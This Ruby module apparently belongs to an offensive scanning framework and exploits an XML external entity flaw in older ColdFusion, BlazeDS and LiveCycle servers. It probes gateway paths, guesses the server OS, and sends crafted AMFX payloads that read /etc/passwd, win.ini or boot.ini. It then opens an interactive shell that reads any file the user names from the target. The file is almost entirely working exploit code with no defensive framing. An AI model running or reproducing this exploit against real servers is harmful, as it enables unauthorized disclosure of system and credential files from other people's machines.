# ColdFusion Locale LFI Exploit Plugin
#
# Try to Exploit XML External Entity (XEE) LFI vulnerability, mostly commonly found in ColdFusion applications. Allows Directory Traversal & Limited File Disclosure as well. Limitations due to limited priviliges service runs as. 
# Affected Sofware: BlazeDS 3.2 and earlier versions, LiveCycle 9.0, 8.2.1, and 8.0.1, LiveCycle Data Services 3.0, 2.6.1, and 2.5.1, Flex Data Services 2.0.1, & ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2.
#
###
# TO DO:
# Build Error Handling In
# (Errno::ECONNREFUSED)
#
class ColdFusionXEELFI < Core::CoreShell
	def initialize
		#Basic Info:
		module_name='ColdFusionXEELFI'
		module_info={
			'Name'        => 'Cold Fusion XML XEE LFI Exploit',
			'Version'     => 'v0.01b',
			'Description' => "This takes advantage of a Directory Traversal & File Disclosure vulnerabilities due to improper parsing & handling of XML Data.\n\tAffected Sofware: \n\tBlazeDS 3.2 and earlier versions, LiveCycle 9.0, 8.2.1, and 8.0.1, LiveCycle Data Services 3.0, 2.6.1, and 2.5.1,\n\t Flex Data Services 2.0.1, & ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2\n\tTarget => The target site and base to run checks for XEE Vuln\n\t\tEX: http://www.site.co.za/\n\t\tEX: https://192.168.1.69:8000/\n\tOS => Target OS Type: Windows, Linux, or Auto (Checks Server Response and Acts Accordingly)",
			'Author'      => 'Hood3dRob1n'
		}

		module_required={ 'Target' => "http://www.site.com/" } 
		module_optional={ 'OS' => 'Auto' }
		@non_set_private_options={ 'Auth' => 0, 'Cookie' => 'nil', 'ProxyIp' => 'nil', 'ProxyPort' => 'nil', 'Username' => 'nil', 'Password' => 'nil' } #Mostly for debugging, and since the second half used net/http there isnt proxy support at this point in time, sorry.....

		if $module_name.nil?
			pluginRegistrar(module_name,module_info,module_required,module_optional)
		else
			cfxeelfi
		end
	end

	def cfxeelfi
		#Initialize our Http::EasyCurb request object with any special values needed, otherwise mark them to nil....
		http = Http::EasyCurb.new(@non_set_private_options['Cookie'],@non_set_private_options['Auth'],@non_set_private_options['ProxyIp'],@non_set_private_options['ProxyPort'],@non_set_private_options['Username'],@non_set_private_options['Password'])

		possibles = [ "/flex2gateway/","/flex2gateway/http", "/flex2gateway/httpsecure", "/flex2gateway/cfamfpolling",	"/flex2gateway/amf", "/flex2gateway/amfpolling", "/messagebroker/http", "/messagebroker/httpsecure", "/blazeds/messagebroker/http", "/blazeds/messagebroker/httpsecure", "/samples/messagebroker/http", "/samples/messagebroker/httpsecure", "/lcds/messagebroker/http", "/lcds/messagebroker/httpsecure", "/lcds-samples/messagebroker/http", "/lcds-samples/messagebroker/httpsecure" ]

		puts "[".light_green + "*".white + "] Target".light_green + ": #{$module_required['Target']}".white
		puts "[".light_green + "*".white + "] Checking for Files associated with this XML External Entity (XEE) Attack".light_green + "....".white
		@os=0 #We only need to find the OS Type once :)
		xlinkz=[] #placeholder
		possibles.each do |xeepath| #Cycle through possible links and see if any exists
			target = "#{$module_required['Target'].sub(/\/$/, '')}#{xeepath}"
			body = http._get(target)
			if body[1] == 200
				puts "[".light_green + " EXISTS ".white + "] ".light_green + "#{target}".white
				xlinkz << "#{target}"
			elsif body[1] == 301
				puts "[".light_yellow + " 301 ".white + "] ".light_yellow + "#{target}".white
				xlinkz << "#{target}"
			elsif body[1] == 302
				puts "[".light_yellow + " 302 ".white + "] ".light_yellow + "#{target}".white
				xlinkz << "#{target}"
			elsif body[1] == 403
				puts "[".light_red + " 403 ".white + "] ".light_red + "#{target}".white
				xlinkz << "#{target}"
			else
				puts "[".light_red + " NOT FOUND ".white + "] ".light_red + "#{target}".white
			end

			#Determine Base OS Type so we can call the right file types for our checks in a minute.....
			if @os.to_i == 0
				if not $module_optional['OS'].downcase == 'windows' and not $module_optional['OS'].downcase == 'linux'
					#Find Server Type Using 'Server' Header Field in Server Response
					if body[3] =~ /server: (.+)/i
						orez = $1
					end
					if not orez.nil?
						if orez =~ /IIS/ or orez =~ /Windows/i or orez =~ /Win32/i or orez =~ /Win64/i
							@orez = orez #Save response for after loop
							@os=1 #!=Windows, 2=*Nix
						elsif orez =~ /Apache\/|CentOS|Red Hat|Debian|Fedora|Linux\/SuSE/i
							@orez = orez #Save response for after loop
							@os=2 #!=Windows, 2=*Nix
						else
							@orez = orez #Save response for after loop
							@os=3 #!=Windows, 2=*Nix, #3=probably unix but who knows....
						end
					end
				else
					if $module_optional['OS'].downcase == 'windows'
						puts "[".light_green + " OS ".white + "] User Set Target OS as ".light_green + ": Windows".white
						@os=1 #!=Windows, 2=*Nix
					else
						puts "[".light_green + "OS ".white + "] User Set Target OS as ".light_green + ": Linux".white
						@os=2 #!=Windows, 2=*Nix
					end
				end
			end
		end

		puts
		#Determine Base OS Type so we can call the right file types for our checks in a minute.....
		if @os.to_i > 0
			if @os.to_i == 1
				puts "[".light_green + "OS".white + "] Windows Server".light_green + ": #{@orez}".white
			elsif @os.to_i == 2
				puts "[".light_green + "OS".white + "] Unix Server".light_green + ": #{@orez}".white
			elsif @os.to_i == 3
				puts "[".light_yellow + "OS".white + "] Unknown Server".light_yellow + ": #{@orez}".white
			end
		end

		puts
		if not xlinkz.empty?
			xlinkz = xlinkz.uniq #Array of viable targets
			puts "[".light_green + "*".white + "] Testing Injection Confirmed Pages, hang tight".light_green + "......".white
			xeecheck(xlinkz)
		else
			puts "[".light_red + "X".white + "] Nothing Found".light_red + "!".white
		end
	end

	def xeecheck(arrayoftargets)
		#Cycle through possible links and check for signs of vulnerability
		@xmark=1
		while @xmark.to_i == 1
			arrayoftargets.each do |xvuln|
				#Set our Array of File Checks based on OS type set previously...
				if @os.to_i == 1
					xfile = [ 'C:\WINDOWS\win.ini', 'C:\boot.ini' ]
				else
					xfile = [ '/etc/passwd' ]
				end

				xfile.each do |xeefile|
					xeeurl = URI.parse(xvuln)
					request = Net::HTTP::Post.new(xeeurl.path)
					request.content_type = 'application/x-amf'
					request.body = "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE test [ <!ENTITY x3 SYSTEM \"#{xeefile}\"> ]><amfx ver=\"3\" xmlns=\"http://www.macromedia.com/2005/amfx\"><body><object type=\"flex.messaging.messages.CommandMessage\"><traits><string>body</string><string>clientId</string><string>correlationId</string><string>destination</string><string>headers</string><string>messageId</string><string>operation</string><string>timestamp</string><string>timeToLive</string></traits><object><traits /></object><null /><string /><string /><object><traits><string>DSId</string><string>DSMessagingVersion</string></traits><string>nil</string><int>1</int></object><string>&x3;</string><int>5</int><int>0</int><int>0</int></object></body></amfx>"

					response = Net::HTTP.start(xeeurl.host, xeeurl.port) do |http|
						foo = http.request(request)
						if (foo.nil?)
							puts "[".light_red + " No Response ".white + "] ".light_red + "#{xvuln}".white
						elsif foo.body =~ /<\?xml version=\"1\.0\" encoding=\"utf-8\"\?>/
							if foo.body =~ /External entities are not allowed/
								puts "[".light_yellow + " XEE Not Allowed ".white + "] ".light_yellow + "#{xvuln}".white
							else
								puts "[".light_green + "*".white + "] Vuln Link: ".light_green + "#{xvuln}".white
								puts "[".light_green + "*".white + "] File: ".light_green + "#{xeefile}".white
								@themark="#{xvuln}"
								@xmark = 0 #Mark Success and Exit Both While Loops as result of change
								break
							end
						elsif (foo.code == 302 or foo.code == 301)
							puts "[".light_yellow + " 302 ".white + "] ".light_yellow + "#{xvuln}".white
							puts "[".light_yellow + " 302 ".white + "] ".light_yellow + "#{foo["location"]}".white
						else
							puts "[".light_red + " Not Working ".white + "] ".light_red + "#{xvuln}".white
						end
					end
					sleep(3) #Short pause between requests (if making more than one)
				end
			end
			break
		end

		#Now we drop to file reader shell if successfull above......
		if @xmark.to_i == 0
			xeeshell
		end
	end

	def xeeshell
		#Our Sudo Shell for File Reading & Directory Traversal
		puts "[".light_green + "*".white + "] Dropping to XEE Directory Traversal & LFI File Reader Shell now".light_green + "......".white
		puts "[".light_green + "*".white + "] Simply type Dirname or Filename to displau> ".light_green + "/etc/passwd".white + " or ".light_green + "C:\\boot.ini".white
		puts "[".light_green + "*".white + "] Type ".light_green + "QUIT".white + " or ".light_green + "EXIT".white + " to exit the shell".light_green + "....".white

		#XEE Shell :p
		foo=0
		while "#{foo}".to_i < 1
			begin
				print "\n(".white + "XEE".light_green + "-".white + "LFI".light_green + "-".white + "File".light_green + "-".white + "Reader ".light_green + ")".white + "> ".light_green
				@cmd = gets.chomp
				puts
				if "#{@cmd.upcase}" == "EXIT" or "#{@cmd.upcase}" == "QUIT"
					puts "[".light_yellow + "*".white + "] OK, exiting XEE LFI Shell session".light_yellow + "......".white
					puts
					break
				end
				xfile="#{@cmd}"
				xeeurl = URI.parse(@themark)

				request = Net::HTTP::Post.new(xeeurl.path, { 'Content-Type' => 'application/x-amf' })
				request.content_type = 'application/x-amf'
				request.body = "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE test [ <!ENTITY x3 SYSTEM \"#{xfile}\"> ]><amfx ver=\"3\" xmlns=\"http://www.macromedia.com/2005/amfx\"><body><object type=\"flex.messaging.messages.CommandMessage\"><traits><string>body</string><string>clientId</string><string>correlationId</string><string>destination</string><string>headers</string><string>messageId</string><string>operation</string><string>timestamp</string><string>timeToLive</string></traits><object><traits /></object><null /><string /><string /><object><traits><string>DSId</string><string>DSMessagingVersion</string></traits><string>nil</string><int>1</int></object><string>&x3;</string><int>5</int><int>0</int><int>0</int></object></body></amfx>"

				response = Net::HTTP.start(xeeurl.host, xeeurl.port) do |http|
					foo = http.request(request)
					if (foo.nil?)
						puts "[".light_red + "*".white + "] No Results Found".light_red + "!".white
					elsif foo.body =~ /<\?xml version=\"1\.0\" encoding=\"utf-8\"\?>/
						puts "\n#{foo.body}\n".cyan
					end
				end
			rescue Timeout::Error
				redo
			rescue Errno::ETIMEDOUT
				redo
			end
		end
	end
end

ColdFusionXEELFI.new
